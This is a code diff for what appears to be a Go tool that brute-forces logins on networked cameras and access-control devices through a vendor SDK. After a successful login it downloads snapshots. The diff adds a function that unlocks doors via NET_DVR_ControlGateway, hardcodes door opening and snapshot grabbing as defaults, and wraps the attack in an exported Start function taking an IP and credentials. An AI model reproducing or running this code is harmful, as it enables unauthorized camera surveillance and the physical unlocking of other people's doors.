@@ -9,7 +9,6 @@ import (
 	"bufio"
 	"encoding/binary"
 	"encoding/csv"
-	"flag"
 	"fmt"
 	"net"
 	"os"
@@ -17,6 +16,7 @@ import (
 	"sync"
 	"time"
 	"unsafe"
+
 	// "encoding/json"
 	"github.com/fatih/color"
 )
@@ -28,6 +28,7 @@ var ping bool
 var logins_file string
 var passwords_file string
 var shoots_path string
+var door bool
 var json_file string
 var csv_file string
 var m3u_file string
@@ -94,7 +95,8 @@ func getSnapshots(ip string, uid int64, startChannel int, count int, login strin
 	downloaded := 0
 
 	for i := startChannel; i < startChannel+count; i++ {
-		filename := fmt.Sprintf("%s%s_%s_%s_%d.jpg", shoots_path, login, password, ip, i)
+		timeNow := time.Now().Format("2006-01-02_15_04_05")
+		filename := fmt.Sprintf("%s%s_%s_%s_%d.jpg", shoots_path, login, timeNow, ip, i)
 		c_filename := C.CString(filename)
 		defer C.free(unsafe.Pointer(c_filename))
 
@@ -145,6 +147,27 @@ func getIpChannelsCount(uid int64) (count int) {
 	return
 }
 
+func openTheDoor(ip string, uid int64, login string, password string, device C.NET_DVR_DEVICEINFO) {
+	var dwStaic C.DWORD
+	var lGatewayIndex C.LONG
+
+	dwStaic = 1
+	lGatewayIndex = 1
+
+	succ.Printf("Logged in: uid: %d\n", uid)
+
+	result := C.NET_DVR_ControlGateway(
+		(C.LONG)(uid),
+		(C.LONG)(lGatewayIndex),
+		(C.DWORD)(dwStaic),
+	)
+
+	if result == 0 {
+		err.Println("Error while open the door, ip: ", ip, " errorCode: ", (int)(C.NET_DVR_GetLastError()))
+	} else {
+		succ.Println("Success while open the door, ip: ", ip)
+	}
+}
 func processSnapshots(ip string, uid int64, login string, password string, device C.NET_DVR_DEVICEINFO) {
 	ip_count := getIpChannelsCount(uid)
 
@@ -205,6 +228,10 @@ func checkLogin(ip string, login string, password string, results chan DeviceInf
 
 		if shoots_path != "" {
 			processSnapshots(ip, uid, login, password, device)
+		}
+
+		if door {
+			openTheDoor(ip, uid, login, password, device)
 		}
 
 		results <- DeviceInfo{
@@ -329,17 +356,29 @@ func dumpGoodCSV(file *os.File, devices *[]CameraAddress) {
 }
 
 func parseFlags() {
-	flag.IntVar(&threads, "threads", 1, "Threads count")
-	flag.IntVar(&bf_threads, "bf-threads", 1, "Bruteforcer threads count")
-	flag.IntVar(&port, "port", 8000, "Camera service port")
-	flag.BoolVar(&ping, "check", false, "Check cameras (experimental and not fully tested, but very useful)")
-	flag.StringVar(&logins_file, "logins", "logins", "A file with a list of logins to bruteforce")
-	flag.StringVar(&passwords_file, "passwords", "passwords", "A file with a list of passwords to bruteforce")
-	flag.StringVar(&shoots_path, "shoots", "", "Download pics from cameras into a folder")
-	flag.StringVar(&csv_file, "csv", "", "Write result to CSV")
-	flag.StringVar(&json_file, "json", "", "Write result to JSON")
-	flag.StringVar(&m3u_file, "m3u", "", "Write result to m3u playlist")
-	flag.Parse()
+	bf_threads = 1
+	threads = 1
+	port = 8000
+	logins_file = "logins"
+	ping = true
+	passwords_file = "passwords"
+	shoots_path = "./pic"
+	door = true
+	csv_file = "csv"
+	json_file = "json"
+	m3u_file = "m3u"
+	// flag.IntVar(&threads, "threads", 1, "Threads count")
+	// flag.IntVar(&bf_threads, "bf-threads", 1, "Bruteforcer threads count")
+	// flag.IntVar(&port, "port", 8000, "Camera service port")
+	// flag.BoolVar(&ping, "check", false, "Check cameras (experimental and not fully tested, but very useful)")
+	// flag.StringVar(&logins_file, "logins", "logins", "A file with a list of logins to bruteforce")
+	// flag.StringVar(&passwords_file, "passwords", "passwords", "A file with a list of passwords to bruteforce")
+	// flag.StringVar(&shoots_path, "shoots", "", "Download pics from cameras into a folder")
+	// flag.BoolVar(&door, "door", false, "enable open door")
+	// flag.StringVar(&csv_file, "csv", "", "Write result to CSV")
+	// flag.StringVar(&json_file, "json", "", "Write result to JSON")
+	// flag.StringVar(&m3u_file, "m3u", "", "Write result to m3u playlist")
+	// flag.Parse()
 }
 
 func initialize() {
@@ -380,7 +419,7 @@ func initialize() {
 	fmt.Println()
 }
 
-func start() {
+func start(ip string) {
 	// Results are stored here
 	var authorized []DeviceInfo
 	var unauthorized []CameraAddress
@@ -441,23 +480,25 @@ func start() {
 	}
 
 	// Sending IPs to bruteforce coroutines
-	inFile, err := os.Open("hosts")
-	if err != nil {
-		panic(err)
-	}
-	defer inFile.Close()
+	// inFile, err := os.Open("hosts")
+	// if err != nil {
+	// 	panic(err)
+	// }
+	// defer inFile.Close()
 
-	scanner := bufio.NewScanner(inFile)
-	scanner.Split(bufio.ScanLines)
-	for scanner.Scan() {
-		ipCh <- scanner.Text()
-	}
+	// scanner := bufio.NewScanner(inFile)
+	// scanner.Split(bufio.ScanLines)
+	// for scanner.Scan() {
+	// 	ipCh <- scanner.Text()
+	// }
+	// close(ipCh)
+	ipCh <- ip
 	close(ipCh)
 
 	bg.Wait()
 }
 
-func main() {
+func Start(ip, user, password string) {
 	parseFlags()
 
 	err = color.New(color.FgRed, color.Bold)
@@ -479,7 +520,9 @@ func main() {
 
 	initialize()
 
-	start()
+	logins = []string{user}
+	passwords = []string{password}
+	start(ip)
 
 	// if (json_file != "") {
 	//	 color.New(color.FgBlue, color.Bold).Println("Writing JSON to", json_file)
